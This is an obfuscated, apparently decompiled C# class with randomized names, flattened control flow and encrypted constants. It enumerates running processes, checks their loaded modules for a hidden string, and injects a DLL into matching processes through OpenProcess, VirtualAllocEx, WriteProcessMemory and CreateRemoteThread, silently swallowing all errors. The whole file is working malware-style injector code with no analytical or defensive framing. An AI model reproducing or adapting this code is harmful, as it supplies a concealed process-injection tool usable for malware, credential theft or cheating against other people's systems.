using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class ctIuyvZRMAdIAmdEcCYQGbwBiufIA
{
	private static readonly IntPtr KFcCiODxSjCkTcCzkRARHAyXqvopA = (IntPtr)_003CModule_003E.caNKiBPreIKCeUBrFUJYAHCfqyTI<int>(437828032u);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr OpenProcess(uint uint_0, int int_0, uint uint_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern int CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, uint uint_0, uint uint_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern int WriteProcessMemory(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr CreateRemoteThread(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, IntPtr intptr_3, IntPtr intptr_4, uint uint_0, IntPtr intptr_5);

	public static void YRrjABsqjTILQRnehkQgWdNOecYl()
	{
		try
		{
			Process[] array = ctIuyvZRMAdIAmdEcCYQGbwBiufIA.WQXSncLnnUCLxzZfobYIPzfObfBV();
			int num = _003CModule_003E.hoNHQIKvmlteoxZbRzFVmgRmkeJN<int>(696500974u);
			Process process_ = default(Process);
			while (true)
			{
				int num2 = 1688600444;
				while (true)
				{
					int num3 = num2;
					uint num4;
					switch ((num4 = (uint)(-(~(~(num3 * -658762507))) * -424075173)) % 7u)
					{
					case 6u:
						iWWNjvTIPdDPknQFKJIZhjYzAmrJA(ctIuyvZRMAdIAmdEcCYQGbwBiufIA.oNcpjGIUpYiNFEpmUJLMCXkAJEgL(ctIuyvZRMAdIAmdEcCYQGbwBiufIA.FULAGxXArZzAqIZJsjCosPkkJpew(process_)));
						num2 = ((int)num4 * -683370991) ^ -2137958752;
						continue;
					case 4u:
					{
						int num6;
						if (num < array.Length)
						{
							num2 = 1464717407;
							num6 = 1464717407;
						}
						else
						{
							num2 = -1084936893;
							num6 = -1084936893;
						}
						continue;
					}
					case 3u:
						num2 = ((int)num4 * -1625232353) ^ 0xB5409B4;
						continue;
					case 2u:
						num += _003CModule_003E.FsXfCOdVPfuECkuSQtBwrUiNuCjv<int>(3524537071u);
						num2 = -1301677552;
						continue;
					case 0u:
					{
						process_ = array[num];
						int num5;
						if (YIdYfAonebOqzmqIMBjpAaJVfpbf(ctIuyvZRMAdIAmdEcCYQGbwBiufIA.whStjHKwvSbarHmyxWdBXEIgPLAc(process_)))
						{
							num2 = -1592499379;
							num5 = -1592499379;
						}
						else
						{
							num2 = 1585172245;
							num5 = 1585172245;
						}
						continue;
					}
					default:
						return;
					case 5u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public unsafe static void iWWNjvTIPdDPknQFKJIZhjYzAmrJA(uint uint_0)
	{
		try
		{
			byte[] array = ctIuyvZRMAdIAmdEcCYQGbwBiufIA.fCkmGqheZJZYIJwSXzpnxzoTjtiB(ctIuyvZRMAdIAmdEcCYQGbwBiufIA.WGGNECIPwoqFmJUOAYqovOPzXGPi(), _003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<string>(4063375361u));
			IntPtr intptr_ = default(IntPtr);
			IntPtr procAddress = default(IntPtr);
			while (true)
			{
				int num = -1345591490;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(~num2 - -636092734)) % 6u)
					{
					case 5u:
						intptr_ = OpenProcess((uint)_003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<int>(2938821260u), _003CModule_003E.uHWcjhhPIQpkTbHjddkymImHgeirB<int>(1152552457u), uint_0);
						num = ((int)num3 * -332599049) ^ -1092609224;
						continue;
					case 4u:
						procAddress = GetProcAddress(GetModuleHandle(_003CModule_003E.PDjehoHWwjjqrxRpBRfgdvjYkkAJ<string>(2527747445u)), _003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<string>(3157279416u));
						num = ((int)num3 * -1617447077) ^ -511556565;
						continue;
					case 2u:
						CloseHandle(intptr_);
						num = (int)((num3 * 604101994) ^ 0x2B6B4076);
						continue;
					case 0u:
					{
						IntPtr intPtr = VirtualAllocEx(intptr_, (IntPtr)(void*)(uint)_003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<int>(2321665813u), (IntPtr)array.Length, (uint)_003CModule_003E.LVBdOaJrpZkwOnxQkSmDUuOVUGAm<int>(896627215u), (uint)_003CModule_003E.FsXfCOdVPfuECkuSQtBwrUiNuCjv<int>(67839172u));
						WriteProcessMemory(intptr_, intPtr, array, (uint)(array.Length + _003CModule_003E.LVBdOaJrpZkwOnxQkSmDUuOVUGAm<int>(3528035793u)), _003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<int>(2321665813u));
						CreateRemoteThread(intptr_, (IntPtr)(void*)(uint)_003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<int>(314796093u), KFcCiODxSjCkTcCzkRARHAyXqvopA, procAddress, intPtr, (uint)_003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<int>(2020883302u), (IntPtr)(void*)(uint)_003CModule_003E.eSYBogRbNcXwiLHXOoNzSnstEWqn<int>(4235881942u));
						num = ((int)num3 * -1842726685) ^ -1027543743;
						continue;
					}
					default:
						return;
					case 3u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static bool YIdYfAonebOqzmqIMBjpAaJVfpbf(string string_0)
	{
		bool result = (byte)_003CModule_003E.ZIEesMDEqZiukGRraWRbhCtueSxd<int>(3826195875u) != 0;
		Process[] array = default(Process[]);
		ProcessModule object_ = default(ProcessModule);
		bool result2 = default(bool);
		while (true)
		{
			int num = -1927540388;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)((~num2 + 1770194858) * 190340951)) % 3u)
				{
				case 1u:
					goto IL_000d;
				case 2u:
					break;
				default:
				{
					IEnumerator enumerator = ctIuyvZRMAdIAmdEcCYQGbwBiufIA.LjmeYRJoYFWYCzlTooAvwDAOKulp((ReadOnlyCollectionBase)ctIuyvZRMAdIAmdEcCYQGbwBiufIA.dIBDZTrBdOPBVGqPspojDSAgcdfe(array[_003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<int>(2321665813u)]));
					try
					{
						while (true)
						{
							int num4;
							int num5;
							if (!ctIuyvZRMAdIAmdEcCYQGbwBiufIA.BsNWKuQwQzRHsBhYQMAPciQLIxVF(enumerator))
							{
								num4 = -699697372;
								num5 = -699697372;
							}
							else
							{
								num4 = -120371124;
								num5 = -120371124;
							}
							while (true)
							{
								num2 = num4;
								switch ((num3 = (uint)((~num2 + 1770194858) * 190340951)) % 7u)
								{
								case 6u:
									object_ = (ProcessModule)ctIuyvZRMAdIAmdEcCYQGbwBiufIA.EfveECqeyZBfiBiozMjhdbJKiosLb(enumerator);
									num4 = 775898864;
									continue;
								case 5u:
									num4 = -120371124;
									continue;
								case 4u:
								{
									int num7;
									int num8;
									if (ctIuyvZRMAdIAmdEcCYQGbwBiufIA.AEXSUyGOFuiXocGrqXbGTaEwIeOF(ctIuyvZRMAdIAmdEcCYQGbwBiufIA.FWHffpBfFJDnrAUXuCKEwfFnBdAY((object)object_), _003CModule_003E.ZIEesMDEqZiukGRraWRbhCtueSxd<string>(1484296719u)))
									{
										num7 = -1918012049;
										num8 = -1918012049;
									}
									else
									{
										num7 = 966227593;
										num8 = 966227593;
									}
									num4 = num7 ^ ((int)num3 * -1598036302);
									continue;
								}
								case 0u:
								{
									int num6 = _003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<int>(854839377u);
									result = (byte)num6 != 0;
									result2 = (byte)num6 != 0;
									num4 = ((int)num3 * -1586987160) ^ 0xAE2BA0E;
									continue;
								}
								case 3u:
									break;
								default:
									return result;
								case 2u:
									return result;
								case 1u:
									return result2;
								}
								break;
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable idisposable_)
						{
							while (true)
							{
								IL_0193:
								int num9 = 338024309;
								while (true)
								{
									num2 = num9;
									switch ((num3 = (uint)((~num2 + 1770194858) * 190340951)) % 3u)
									{
									case 1u:
										goto IL_0155;
									default:
										goto end_IL_016a;
									case 0u:
										break;
									case 2u:
										goto end_IL_016a;
									}
									goto IL_0193;
									IL_0155:
									ctIuyvZRMAdIAmdEcCYQGbwBiufIA.ULatCTjHpYNtQCYzkwGNYjSKjWPB(idisposable_);
									num9 = (int)(num3 * 1299269887) ^ -1010432726;
									continue;
									end_IL_016a:
									break;
								}
								break;
							}
						}
					}
				}
				}
				break;
				IL_000d:
				array = ctIuyvZRMAdIAmdEcCYQGbwBiufIA.RncAdCrLyEawlVHmzguxukDYHhrC(string_0);
				num = ((int)num3 * -1966294774) ^ 0x58C32240;
			}
		}
	}

	static Process[] WQXSncLnnUCLxzZfobYIPzfObfBV()
	{
		return Process.GetProcesses();
	}

	static string whStjHKwvSbarHmyxWdBXEIgPLAc(Process process_0)
	{
		return process_0.ProcessName;
	}

	static int FULAGxXArZzAqIZJsjCosPkkJpew(Process process_0)
	{
		return process_0.Id;
	}

	static uint oNcpjGIUpYiNFEpmUJLMCXkAJEgL(int int_0)
	{
		return Convert.ToUInt32(int_0);
	}

	static Encoding WGGNECIPwoqFmJUOAYqovOPzXGPi()
	{
		return Encoding.ASCII;
	}

	static byte[] fCkmGqheZJZYIJwSXzpnxzoTjtiB(Encoding encoding_0, string string_0)
	{
		return encoding_0.GetBytes(string_0);
	}

	static Process[] RncAdCrLyEawlVHmzguxukDYHhrC(string string_0)
	{
		return Process.GetProcessesByName(string_0);
	}

	static ProcessModuleCollection dIBDZTrBdOPBVGqPspojDSAgcdfe(Process process_0)
	{
		return process_0.Modules;
	}

	static IEnumerator LjmeYRJoYFWYCzlTooAvwDAOKulp(ReadOnlyCollectionBase readOnlyCollectionBase_0)
	{
		return readOnlyCollectionBase_0.GetEnumerator();
	}

	static object EfveECqeyZBfiBiozMjhdbJKiosLb(IEnumerator ienumerator_0)
	{
		return ienumerator_0.Current;
	}

	static string FWHffpBfFJDnrAUXuCKEwfFnBdAY(object object_0)
	{
		return object_0.ToString();
	}

	static bool AEXSUyGOFuiXocGrqXbGTaEwIeOF(string string_0, string string_1)
	{
		return string_0.Contains(string_1);
	}

	static bool BsNWKuQwQzRHsBhYQMAPciQLIxVF(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	static void ULatCTjHpYNtQCYzkwGNYjSKjWPB(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}
}
